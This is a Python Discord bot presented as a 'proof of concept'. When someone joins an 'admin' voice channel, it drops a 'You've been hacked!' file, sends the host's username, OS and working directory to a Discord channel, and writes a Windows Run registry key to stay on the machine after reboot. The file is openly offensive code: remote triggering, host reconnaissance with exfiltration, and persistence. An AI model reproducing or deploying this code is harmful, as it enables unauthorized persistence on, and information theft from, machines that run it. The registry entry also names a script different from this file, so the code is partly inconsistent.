# voice_test.py
import os
from pathlib import Path
from datetime import datetime
import asyncio
from dotenv import load_dotenv
import discord
from discord.ext import commands
import winreg  
import platform  

load_dotenv()
TOKEN = os.getenv("DISCORD_BOT_TOKEN")
if not TOKEN:
    raise SystemExit("Missing DISCORD_BOT_TOKEN in .env")

# ---- Config ----
TRIGGER_VC_NAME = "admin"
ALERT_TEXT_CH   = "admin"
OUTPUT_DIR      = Path("./hs_poc_outputs")
FILENAME_PREFIX = "youve_been_hacked"
# -----------------

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.voice_states = True

bot = commands.Bot(command_prefix="!test ", intents=intents)

@bot.event
async def on_ready():
    print("===== BOT READY =====")
    print(f"Bot user: {bot.user}  (id: {bot.user.id})")
    print(f"Intents -> message_content={bot.intents.message_content} members={bot.intents.members} voice_states={bot.intents.voice_states}")
    for g in bot.guilds:
        vchs = [f"{vc.name} (id:{vc.id})" for vc in g.voice_channels]
        print(f" - {g.name}: voice channels: {vchs if vchs else 'none'}")
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    print(f"Output directory: {OUTPUT_DIR.resolve()}")
    print("====================")

async def open_in_notepad(path: Path):
    """ Launch Notepad without blocking the event loop. """
    def _launch():
        os.system(f'notepad.exe "{path}"')
    await asyncio.to_thread(_launch)

# ---- Action 1: System Info Dump ----
async def system_info_dump_discord(member: discord.Member, channel_name: str):
    text_channel = discord.utils.get(member.guild.text_channels, name=ALERT_TEXT_CH)
    if not text_channel:
        print(f"[WARN] Could not find text channel #{ALERT_TEXT_CH}")
        return

    ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    message = (
        "===== SYSTEM INFO DUMP =====\n"
        f"Time:    {ts}\n"
        f"Guild:   {member.guild.name}\n"
        f"Actor:   {member} (id:{member.id})\n"
        f"Channel: {channel_name}\n"
        "--------------------------------------------\n"
        f"User:    {os.getlogin()}\n"
        f"OS:      {platform.platform()}\n"
        f"CWD:     {os.getcwd()}\n"
    )
    try:
        await text_channel.send(f"```{message}```")
        print(f"[INFO] System info sent to #{ALERT_TEXT_CH}")
    except discord.Forbidden:
        print(f"[WARN] No permission to send to #{ALERT_TEXT_CH}")
    except Exception as e:
        print(f"[ERR] Failed sending system info: {e}")

# ---- Action 2: Registry Key Persistence ----
async def registry_persistence(member: discord.Member, channel_name: str):
    """
    Create a simple Run key entry in HKCU so the bot persists after reboot.
    (Proof-of-concept only!)
    """
    try:
        script_path = os.path.abspath("Voice_State_Change.py")
        reg_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(reg_key, "DiscordVoicePOC", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(reg_key)

        msg = f"📝 Registry persistence key added for {member.display_name} (channel: {channel_name})"
        print(f"[INFO] {msg}")
        text_channel = discord.utils.get(member.guild.text_channels, name=ALERT_TEXT_CH)
        if text_channel:
            await text_channel.send(msg)

    except Exception as e:
        msg = f"[ERR] Failed to set registry persistence: {e}"
        print(msg)
        text_channel = discord.utils.get(member.guild.text_channels, name=ALERT_TEXT_CH)
        if text_channel:
            await text_channel.send(msg)

# ---- Event: Voice State Update ----
@bot.event
async def on_voice_state_update(member: discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    if before.channel == after.channel or after.channel is None:
        return

    if after.channel.name.lower() != TRIGGER_VC_NAME.lower():
        return

    # 1) Post a Discord alert
    text_channel = discord.utils.get(member.guild.text_channels, name=ALERT_TEXT_CH)
    if text_channel:
        try:
            await text_channel.send(f"🔔 **{member.display_name}** joined the **{after.channel.name}** voice channel.")
        except discord.Forbidden:
            print(f"[WARN] No permission to send to #{ALERT_TEXT_CH} in {member.guild.name}")
        except Exception as e:
            print(f"[ERR] Failed to send alert message: {e}")

    # 2) Create a local file
    ts = datetime.utcnow().strftime("%Y%m%d-%H%M%S")
    fname = f"{FILENAME_PREFIX}_{ts}.txt"
    fpath = OUTPUT_DIR / fname
    try:
        with open(fpath, "w", encoding="utf-8") as f:
            f.write(
                "You've been hacked!\n"
                "--------------------------------------------\n"
                f"UTC Time: {datetime.utcnow().isoformat()}Z\n"
                f"Guild:    {member.guild.name}\n"
                f"Actor:    {member} (id:{member.id})\n"
                f"Channel:  {after.channel.name} (id:{after.channel.id})\n"
            )
        print(f"[INFO] Wrote file: {fpath}")
    except Exception as e:
        print(f"[ERR] Failed writing file: {e}")
        return

    # 3) Open in Notepad
    try:
        asyncio.create_task(open_in_notepad(fpath))
        print("[INFO] Notepad launch requested.")
    except Exception as e:
        print(f"[ERR] Failed launching Notepad: {e}")

    # 4) System Info Dump to Discord
    try:
        await system_info_dump_discord(member, after.channel.name)
    except Exception as e:
        print(f"[ERR] System info dump failed: {e}")

    # 5) Registry Persistence
    try:
        await registry_persistence(member, after.channel.name)
    except Exception as e:
        print(f"[ERR] Registry persistence failed: {e}")

# ---- Command ----
@bot.command(name="whoami")
async def whoami(ctx):
    await ctx.send(f"I am {bot.user} (id: {bot.user.id})")

if __name__ == "__main__":
    print("Starting minimal voice-trigger PoC bot…")
    bot.run(TOKEN)
